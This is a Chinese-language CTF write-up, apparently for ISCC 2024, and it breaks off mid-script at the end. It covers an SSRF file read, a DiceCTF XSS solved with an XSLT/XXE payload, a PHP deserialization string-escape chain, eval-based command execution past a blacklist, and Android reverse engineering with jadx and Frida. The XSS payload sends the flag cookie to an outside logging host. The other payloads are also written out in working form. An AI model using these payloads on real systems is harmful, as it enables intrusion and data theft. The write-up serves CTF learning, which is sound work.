<p>CVE-2021-40438</p>
<p>是一个SSRF的漏洞</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccee7709.png" alt="image-20240525011809524"></p>
<p>通过php读文件 (payload需要xor)</p>
<p><code>php -r &quot;echo file_get_contents(&#39;http://secret.host/flag&#39;);&quot;</code></p>
<p>读到flag</p>
<h4 id="一道普通的XSS题目"><a href="#一道普通的XSS题目" class="headerlink" title="一道普通的XSS题目"></a>一道普通的XSS题目</h4><p>研究了一下</p>
<p>发现了一道相似的题</p>
<p><code>[DiceCTF 2023 writeups (ankursundara.com)](https://blog.ankursundara.com/dicectf23-writeups/)</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">const cookieParser = require(&#x27;cookie-parser&#x27;);</span><br><span class="line">const app = express();</span><br><span class="line">app.use(cookieParser());</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    // free xss, how hard could it be?</span><br><span class="line">    res.end(req.query?.xss ?? &#x27;welcome to impossible-xss&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/flag&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    // flag in admin bot&#x27;s FLAG cookie</span><br><span class="line">    res.end(req.cookies?.FLAG ?? &#x27;dice&#123;fakeflag&#125;&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(8080);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const page = await ctx.newPage();</span><br><span class="line">await page.goto(&#x27;https://impossible-xss.mc.ax&#x27;, &#123; timeout: 3000, waitUntil: &#x27;domcontentloaded&#x27; &#125;);</span><br><span class="line"></span><br><span class="line">// you wish it was that easy</span><br><span class="line">await page.setCookie(&#123;</span><br><span class="line">        &quot;name&quot;: &quot;FLAG&quot;,</span><br><span class="line">        &quot;value&quot;: flag,</span><br><span class="line">        &quot;domain&quot;: &quot;impossible-xss.mc.ax&quot;,</span><br><span class="line">        &quot;path&quot;: &quot;/&quot;,</span><br><span class="line">        &quot;httpOnly&quot;: true,</span><br><span class="line">        &quot;secure&quot;: true,</span><br><span class="line">        &quot;sameSite&quot;: &quot;Strict&quot;</span><br><span class="line">&#125;);</span><br><span class="line">await page.setJavaScriptEnabled(false);</span><br><span class="line"></span><br><span class="line">await page.goto(YOUR_URL, &#123; timeout: 3000, waitUntil: &#x27;domcontentloaded&#x27; &#125;);</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xmls = `&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">   &lt;!ENTITY xxe SYSTEM  &quot;https://impossible-xss.mc.ax/flag&quot; &gt;]&gt;</span><br><span class="line">&lt;xsl:stylesheet xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; version=&quot;1.0&quot;&gt;</span><br><span class="line">  &lt;xsl:template match=&quot;/asdf&quot;&gt;</span><br><span class="line">    &lt;HTML&gt;</span><br><span class="line">      &lt;HEAD&gt;</span><br><span class="line">        &lt;TITLE&gt;&lt;/TITLE&gt;</span><br><span class="line">      &lt;/HEAD&gt;</span><br><span class="line">      &lt;BODY&gt;</span><br><span class="line">        &lt;img&gt;</span><br><span class="line">          &lt;xsl:attribute name=&quot;src&quot;&gt;</span><br><span class="line">            https://hc.lc/log2.php?&amp;xxe;</span><br><span class="line">          &lt;/xsl:attribute&gt;</span><br><span class="line">        &lt;/img&gt;</span><br><span class="line">      &lt;/BODY&gt;</span><br><span class="line">    &lt;/HTML&gt;</span><br><span class="line">  &lt;/xsl:template&gt;</span><br><span class="line">&lt;/xsl:stylesheet&gt;`</span><br><span class="line"></span><br><span class="line">xml=`&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;data:text/plain;base64,$&#123;btoa(xmls)&#125;&quot;?&gt;</span><br><span class="line">&lt;asdf&gt;&lt;/asdf&gt;`</span><br><span class="line">xss=encodeURIComponent(xml)</span><br></pre></td></tr></table></figure>





<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://impossible-xss.mc.ax/?xss=%3C%3Fxml%20version%3D%221.0%22%3F%3E%0A%3C%3Fxml-stylesheet%20type%3D%22text%2Fxsl%22%20href%3D%22data%3Atext%2Fplain%3Bbase64%2CPD94bWwgdmVyc2lvbj0iMS4wIj8%2BCjwhRE9DVFlQRSBhIFsKICAgPCFFTlRJVFkgeHhlIFNZU1RFTSAgImh0dHBzOi8vaW1wb3NzaWJsZS14c3MubWMuYXgvZmxhZyIgPl0%2BCjx4c2w6c3R5bGVzaGVldCB4bWxuczp4c2w9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvWFNML1RyYW5zZm9ybSIgdmVyc2lvbj0iMS4wIj4KICA8eHNsOnRlbXBsYXRlIG1hdGNoPSIvYXNkZiI%2BCiAgICA8SFRNTD4KICAgICAgPEhFQUQ%2BCiAgICAgICAgPFRJVExFPjwvVElUTEU%2BCiAgICAgIDwvSEVBRD4KICAgICAgPEJPRFk%2BCiAgICAgICAgPGltZz4KICAgICAgICAgIDx4c2w6YXR0cmlidXRlIG5hbWU9InNyYyI%2BCiAgICAgICAgICAgIGh0dHBzOi8vaGMubGMvbG9nMi5waHA%2FJnh4ZTsKICAgICAgICAgIDwveHNsOmF0dHJpYnV0ZT4KICAgICAgICA8L2ltZz4KICAgICAgPC9CT0RZPgogICAgPC9IVE1MPgogIDwveHNsOnRlbXBsYXRlPgo8L3hzbDpzdHlsZXNoZWV0Pg%3D%3D%22%3F%3E%0A%3Casdf%3E%3C%2Fasdf%3E</span><br></pre></td></tr></table></figure>







<h3 id="擂台题-2"><a href="#擂台题-2" class="headerlink" title="擂台题"></a>擂台题</h3><h4 id="《狂飙》知多少"><a href="#《狂飙》知多少" class="headerlink" title="《狂飙》知多少"></a>《狂飙》知多少</h4><p>给了一个网页</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccf4e4e0.png" alt="image-20240506201453561"></p>
<p>这句话对应台词是：你就是个臭卖鱼的,我想吃鱼了,你就遭老罪喽</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccf83439.png" alt="image-20240506201913104"></p>
<p>也是：你就是个臭卖鱼的,我想吃鱼了,你就遭老罪喽</p>
<p>然后拿到源码：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fcceaa321.png" alt="image-20240506201957998"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./2024ISCC.php&quot;</span>);</span><br><span class="line"><span class="comment">// 欢迎大家来到ISCC，本题大家将扮演《狂飙》中的警察，寻找关键证据，抓捕犯罪嫌疑人。</span></span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_string</span>(<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">police</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$work</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$awarding</span> = <span class="string">&quot;salary&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt;work = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我是一名人民警察，打击违法犯罪义不容辞&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt; work = <span class="keyword">new</span> <span class="title function_ invoke__">suspect</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt; work -&gt; evidence_video;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt; work -&gt; evidence_fingerprint;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">suspect</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$video</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fingerprint</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$name</span> == <span class="string">&quot;evidence_video&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;property.transactions怎么可能这么容易获得呢?&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;blood.fingerprint怎么可能这么容易获得呢?&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; video = <span class="string">&quot;property.transactions&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; fingerprint = <span class="string">&quot;blood.fingerprint&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;差点就让你获得证据了&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tools</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$object</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$camera</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$technology</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;使用camera和technology可以找到蛛丝马迹&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; camera = <span class="number">1</span>;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; technology  = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">object</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$safe</span> = <span class="string">&quot;evil&quot;</span>;</span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$safe</span>, <span class="string">&quot;light&quot;</span>, <span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;evidence&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">police</span>(<span class="variable">$_GET</span>[<span class="string">&quot;evidence&quot;</span>])));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$tips</span>;</span><br><span class="line">    <span class="keyword">if</span>((<span class="title function_ invoke__">strpos</span>(<span class="variable">$a</span>, <span class="variable">$tips</span>) !== <span class="literal">false</span>) &amp;&amp; <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>) -&gt; awarding == <span class="string">&quot;pennant&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>反序列化+字符串逃逸</p>
<p>字符串逃逸的话是构造：awarding&#x3D;pennat</p>
<p>也就是每次多1个</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;evil&quot;</span>*<span class="built_in">len</span>(<span class="string">&#x27;&quot;;s:8:&quot;awarding&quot;;s:7:&quot;pennant&quot;;&#125;&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fcce1f838.png" alt="image-20240506202649292"></p>
<p>得到：</p>
<p>evilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevil</p>
<p>结合一下也就是：</p>
<p>evilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevil”;s:8:”awarding”;s:7:”pennant”;}</p>
<p>然后就是反序列化的触发：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">suspect</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$video</span>= <span class="string">&quot;property.transactions&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fingerprint</span>= <span class="string">&quot;blood.fingerprint&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;video = <span class="string">&quot;property.transactions&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fingerprint = <span class="string">&quot;blood.fingerprint&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;差点就让你获得证据了&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tools</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$object</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$camera</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$technology</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">object</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">tools</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="keyword">object</span>=<span class="keyword">new</span> <span class="title function_ invoke__">suspect</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>).<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fcce6fb55.png" alt="image-20240506203452933"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:5:&quot;tools&quot;:3:&#123;s:6:&quot;object&quot;;O:7:&quot;suspect&quot;:2:&#123;s:14:&quot; suspect video&quot;;s:21:&quot;property.transactions&quot;;s:20:&quot; suspect fingerprint&quot;;s:17:&quot;blood.fingerprint&quot;;&#125;s:13:&quot; tools camera&quot;;i:1;s:17:&quot; tools technology&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fcce24850.png" alt="image-20240506203641586"></p>
<p>将我们字符串逃逸的结果接到这个后面就行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?evidence=?evidence=O:5:&quot;tools&quot;:3:&#123;s:6:&quot;object&quot;;O:7:&quot;suspect&quot;:2:&#123;s:14:&quot;suspectvideo&quot;;s:21:&quot;property.transactions&quot;;s:20:&quot;suspectfingerprint&quot;;s:17:&quot;blood.fingerprint&quot;;&#125;s:13:&quot;toolscamera&quot;;i:1;s:17:&quot;toolstechnology&quot;;i:1;&#125;evilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevil&quot;;s:8:&quot;awarding&quot;;s:7:&quot;pennant&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fcce78464.png" alt="image-20240506204153616"></p>
<p>ISCC{vI3OzkwefMyu@vBK}</p>
<h4 id="最喜欢的一集"><a href="#最喜欢的一集" class="headerlink" title="最喜欢的一集"></a>最喜欢的一集</h4><p>进来</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccd40747.png" alt="image-20240525130727071"></p>
<p>hint是welcome.php 访问一下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fcce43117.png" alt="image-20240525130936293"></p>
<p>黑名单过滤 简单绕过一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ISCC=eval(&quot;sys$&#123;0&#125;tem(&#x27;ls /&#x27;);&quot;)</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fcce51e83.png" alt="image-20240525131056762"></p>
<p>出了目录</p>
<p>但是禁了一些读文件的命令 但是明显没禁完</p>
<p>这里我们用head命令读flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ISCC=eval(&quot;sys$&#123;0&#125;tem(&#x27;head /flaaaaaaaaagggggg&#x27;);&quot;)</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccdf0670.png" alt="image-20240525131449109"></p>
<h2 id="mobile"><a href="#mobile" class="headerlink" title="mobile"></a>mobile</h2><h3 id="练武题-3"><a href="#练武题-3" class="headerlink" title="练武题"></a>练武题</h3><h4 id="Puzzle-Game"><a href="#Puzzle-Game" class="headerlink" title="Puzzle_Game"></a>Puzzle_Game</h4><p>附件给了一个apk文件</p>
<p>将apk文件拖入jadx</p>
<p>在源代码&#x2F;com&#x2F;example.whathappened&#x2F;Receiver中找到关键信息–随机数种子<code>3468L</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fcfba3a0b.png" alt="image-20240506195506007"></p>
<p>编写java代码，生成对应的随机字节数组</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">payload</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] array=generateSalt(<span class="number">16</span>);</span><br><span class="line">        System.out.println(Arrays.toString(array));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] generateSalt(<span class="type">int</span> i) &#123;</span><br><span class="line">        <span class="type">byte</span>[] array = <span class="keyword">new</span> <span class="title class_">byte</span>[i];</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Random</span>(<span class="number">3468L</span>).nextBytes(array);</span><br><span class="line">        <span class="keyword">return</span> array;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fcfbcd1dc.png" alt="image-20240506200156653"></p>
<p>[56, 88, 36, -37, -15, -20, 48, 67, 51, -86, 122, -114, -76, 78, 63, 71]</p>
<p>ok 然后写python脚本生成对应flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">a = <span class="keyword">lambda</span> x: [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> x]</span><br><span class="line">b = <span class="keyword">lambda</span> x: base64.b64encode(<span class="built_in">bytes</span>(x)).decode()</span><br><span class="line">c = <span class="keyword">lambda</span> x: [c_uint8(i).value <span class="keyword">for</span> i <span class="keyword">in</span> x]</span><br><span class="line">enc0 = a(<span class="string">&quot;04999999gwC9nOCNUhsHqZm&quot;</span>)</span><br><span class="line">p = c([<span class="number">56</span>, <span class="number">88</span>, <span class="number">36</span>, -<span class="number">37</span>, -<span class="number">15</span>, -<span class="number">20</span>, <span class="number">48</span>, <span class="number">67</span>, <span class="number">51</span>, -<span class="number">86</span>, <span class="number">122</span>, -<span class="number">114</span>, -<span class="number">76</span>, <span class="number">78</span>, <span class="number">63</span>, <span class="number">71</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc0)):</span><br><span class="line">    enc0[i] ^= p[i % <span class="built_in">len</span>(p)]</span><br><span class="line">mn = a(b(p + enc0))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mn)):</span><br><span class="line">    mn[i] += <span class="number">0x7f</span></span><br><span class="line">    mn[i] &amp;= <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mn)):</span><br><span class="line">    <span class="keyword">if</span> i &amp; <span class="number">1</span> == <span class="number">0</span>:</span><br><span class="line">        mn[i] ^= <span class="number">0x7b</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        mn[i] ^= <span class="number">0xea</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ISCC&#123;&quot;</span>+b(mn)[:<span class="number">32</span>]+<span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>



<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fcfc29a29.png" alt="image-20240506200646499"></p>
<p>ISCC{tS+dAMpEvBi3LrcTiweLJIguyESqHJwY}</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fcfb4d6de.png" alt="image-20240506200749969"></p>
<h4 id="ChallengeMobile"><a href="#ChallengeMobile" class="headerlink" title="ChallengeMobile"></a>ChallengeMobile</h4><p>jadx反编译</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fcfbaa55f.png" alt="image-20240525014205696"></p>
<p>发现是在动态加载dex </p>
<p>frida然后hook的native混淆方法的返回值 dump下来dex</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fcfc3d567.png" alt="image-20240525014221076"></p>
<p>写个脚本可以跑：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Java.perform(function () &#123;</span></span><br><span class="line"><span class="string">    var MainActivity = Java.use(&quot;com.example.challengemobile.MainActivity&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    MainActivity.a.implementation = function (bArr) &#123;</span></span><br><span class="line"><span class="string">        var result = this.a(bArr);</span></span><br><span class="line"><span class="string">        console.log(&quot;res: &quot;, result);</span></span><br><span class="line"><span class="string">        return result;</span></span><br><span class="line"><span class="string">    &#125;;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">message</span> (message, data):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&quot;type&quot;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(message[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line">process = frida.get_remote_device().attach(<span class="string">&#x27;challengemobile&#x27;</span>)</span><br><span class="line">script= process.create_script(jscode)</span><br><span class="line">script.on(<span 